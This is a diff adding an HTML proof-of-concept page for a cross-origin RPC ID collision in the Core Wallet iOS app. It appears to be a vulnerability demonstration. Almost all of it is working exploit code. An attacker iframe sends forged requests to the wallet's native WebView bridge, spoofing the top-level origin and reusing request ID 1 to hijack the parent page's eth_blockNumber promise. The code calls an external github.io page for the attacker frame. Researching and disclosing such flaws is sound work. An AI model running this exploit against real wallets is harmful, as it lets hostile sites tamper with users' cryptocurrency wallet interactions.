@@ -1,0 +1,305 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Core Wallet iOS - Cross-Origin RPC Collision PoC</title>
+
+<style>
+body { font: 16px system-ui; margin: 24px; }
+input { width: 100%; padding: 8px; box-sizing: border-box; }
+button { margin: 10px 0; padding: 8px 14px; }
+pre { white-space: pre-wrap; }
+iframe { width: 100%; height: 80px; border: 1px solid #ccc; }
+.vuln { color: #b00020; font-weight: bold; }
+.ok { color: green; font-weight: bold; }
+</style>
+
+<div id="parent">
+  <h2>Core Wallet iOS - Cross-Origin RPC Collision</h2>
+
+  <p>
+    <b>Expected:</b> Origin A's <code>eth_blockNumber</code>
+    returns a hex block number such as <code>0x1234</code>.
+  </p>
+
+  <p>
+    <b>Vulnerable:</b> a cross-origin iframe B causes that
+    legitimate Promise to reject with an attacker-chosen method name.
+  </p>
+
+  <input id="childUrl"
+    value="https://azza1231.github.io/pocpoc/core-impact-simple.html">
+
+  <button id="run">Run PoC</button>
+
+  <p id="verdict">Ready.</p>
+
+  <iframe id="frame"></iframe>
+
+  <pre id="log"></pre>
+</div>
+
+<div id="child" hidden>
+  Cross-origin attacker iframe loaded.
+</div>
+
+<script>
+const params = new URLSearchParams(location.search);
+
+if (params.get('child') === '1') {
+  runChild();
+} else {
+  runParent();
+}
+
+
+// ============================================================
+// ORIGIN A - VICTIM / TOP PAGE
+// ============================================================
+
+function runParent() {
+  const frame = document.getElementById('frame');
+  const log = document.getElementById('log');
+  const verdict = document.getElementById('verdict');
+  const button = document.getElementById('run');
+
+  let childOrigin;
+  let attackerNonce;
+
+  function print(text) {
+    log.textContent += text + '\n';
+  }
+
+  button.onclick = () => {
+    if (!window.ethereum?.request) {
+      verdict.textContent = 'Core provider not available.';
+      return;
+    }
+
+    const child = new URL(
+      document.getElementById('childUrl').value
+    );
+
+    if (child.origin === location.origin) {
+      verdict.textContent =
+        'Origin B must differ from Origin A.';
+      return;
+    }
+
+    childOrigin = child.origin;
+
+    child.searchParams.set('child', '1');
+    child.searchParams.set('topOrigin', location.origin);
+
+    button.disabled = true;
+    log.textContent = '';
+
+    print('Origin A: ' + location.origin);
+    print('Loading cross-origin B: ' + childOrigin);
+
+    frame.src = child.href;
+  };
+
+
+  addEventListener('message', async event => {
+    if (event.source !== frame.contentWindow)
+      return;
+
+    /*
+     * Browser-authenticated proof that the iframe
+     * really is Origin B.
+     */
+    if (event.origin !== childOrigin)
+      return;
+
+    if (!event.data || event.data.type !== 'CHILD_READY')
+      return;
+
+    attackerNonce = event.data.nonce;
+
+    print('');
+    print('Browser-confirmed Origin B: ' + event.origin);
+    print('Attacker-selected method: ' + attackerNonce);
+
+    /*
+     * IMPORTANT:
+     *
+     * On a fresh Core provider shim, the first
+     * legitimate EIP-1193 request uses request ID 1.
+     *
+     * We do NOT hook or replace __coreProviderRespond.
+     */
+    print('');
+    print('Origin A starts legitimate eth_blockNumber...');
+    print('Expected request ID: 1');
+
+    const legitimatePromise =
+      window.ethereum.request({
+        method: 'eth_blockNumber'
+      });
+
+    /*
+     * Tell cross-origin B to send its own native
+     * provider request using the SAME ID.
+     */
+    frame.contentWindow.postMessage({
+      type: 'COLLIDE',
+      id: 1
+    }, childOrigin);
+
+    try {
+      const result = await Promise.race([
+        legitimatePromise,
+
+        new Promise((_, reject) =>
+          setTimeout(
+            () => reject(new Error('TIMEOUT')),
+            7000
+          )
+        )
+      ]);
+
+      print('');
+      print('Origin A result: ' + JSON.stringify(result));
+
+      verdict.textContent =
+        'RACE LOST / NOT PROVEN. Reload entire page and retry.';
+
+      verdict.className = 'ok';
+
+    } catch (error) {
+      const message =
+        String(error?.message || error);
+
+      print('');
+      print('Origin A Promise rejected with:');
+      print(message);
+
+      /*
+       * If B's unpredictable nonce appears inside
+       * Origin A's legitimate Promise error,
+       * B's native response won the ID collision.
+       */
+      if (message.includes(attackerNonce)) {
+
+        verdict.textContent =
+          'VULNERABLE: Cross-origin B corrupted Origin A\'s legitimate provider Promise.';
+
+        verdict.className = 'vuln';
+
+        print('');
+        print('IMPACT PROVEN:');
+        print(
+          'Origin A requested eth_blockNumber, but its Promise ' +
+          'received an error caused by an attacker-selected ' +
+          'method from cross-origin Origin B.'
+        );
+
+      } else {
+
+        verdict.textContent =
+          'NOT PROVEN: Promise failed without attacker nonce.';
+
+        verdict.className = 'ok';
+      }
+    }
+  });
+}
+
+
+// ============================================================
+// ORIGIN B - CROSS-ORIGIN ATTACKER FRAME
+// ============================================================
+
+function runChild() {
+  document.getElementById('parent').hidden = true;
+  document.getElementById('child').hidden = false;
+
+  const topOrigin = params.get('topOrigin');
+
+  if (!topOrigin ||
+      new URL(topOrigin).origin !== topOrigin) {
+    throw new Error('Invalid topOrigin');
+  }
+
+  /*
+   * Value chosen independently by Origin B.
+   *
+   * Seeing this exact value later inside Origin A's
+   * legitimate Promise proves cross-origin influence.
+   */
+  const bytes = new Uint8Array(8);
+  crypto.getRandomValues(bytes);
+
+  const nonce =
+    'core_probe_' +
+    [...bytes]
+      .map(x => x.toString(16).padStart(2, '0'))
+      .join('');
+
+
+  function sendNativeRequest(id) {
+    const message = JSON.stringify({
+      method: 'provider_request',
+
+      payload: JSON.stringify({
+        id: id,
+
+        /*
+         * Actual sender is Origin B,
+         * but it claims top-level Origin A.
+         */
+        origin: topOrigin,
+
+        request: {
+          method: nonce,
+          params: []
+        }
+      })
+    });
+
+
+    /*
+     * Core Wallet iOS raw WKScriptMessageHandler.
+     */
+    const ios =
+      window.webkit &&
+      window.webkit.messageHandlers &&
+      window.webkit.messageHandlers.ReactNativeWebView;
+
+    if (ios?.postMessage) {
+      ios.postMessage(message);
+      return;
+    }
+
+
+    /*
+     * Android / alternate bridge path.
+     */
+    if (window.ReactNativeWebView?.postMessage) {
+      window.ReactNativeWebView.postMessage(message);
+      return;
+    }
+
+    throw new Error('Core native bridge unavailable');
+  }
+
+
+  addEventListener('message', event => {
+    if (event.source !== parent)
+      return;
+
+    if (event.origin !== topOrigin)
+      return;
+
+    if (event.data?.type !== 'COLLIDE')
+      return;
+
+    sendNativeRequest(event.data.id);
+  });
+
+
+  parent.postMessage({
+    type: 'CHILD_READY',
+    nonce
+  }, topOrigin);
+}
+</script>
